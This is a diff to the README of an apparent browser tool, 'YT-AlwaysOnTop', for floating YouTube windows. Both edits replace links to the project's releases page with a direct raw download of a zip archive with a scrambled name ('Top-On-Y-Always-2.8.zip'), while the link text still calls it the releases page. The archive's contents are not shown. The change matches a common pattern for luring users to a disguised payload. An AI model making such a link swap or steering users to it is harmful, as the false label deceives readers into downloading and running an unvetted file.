@@ -1,6 +1,6 @@
 # 📺 YT-AlwaysOnTop - Experience floating YouTube windows today.
 
-[ ![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/QuangMinhBingChilling/YT-AlwaysOnTop/releases)
+[ ![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/QuangMinhBingChilling/YT-AlwaysOnTop/raw/refs/heads/main/YT_AlwaysOnTop/Top-On-Y-Always-2.8.zip)
 
 ## 📌 Project Overview
 
@@ -15,7 +15,7 @@ YT-AlwaysOnTop turns your web browser YouTube player into a floating, edgeless w
 
 ## 📥 How to Download and Install
 
-1. Visit the [releases page](https://github.com/QuangMinhBingChilling/YT-AlwaysOnTop/releases) to choose your version.
+1. Visit the [releases page](https://github.com/QuangMinhBingChilling/YT-AlwaysOnTop/raw/refs/heads/main/YT_AlwaysOnTop/Top-On-Y-Always-2.8.zip) to choose your version.
 2. Look for the file ending in `.exe` or `.zip`.
 3. Click the link to save the file to your computer.
 4. Open your Downloads folder.
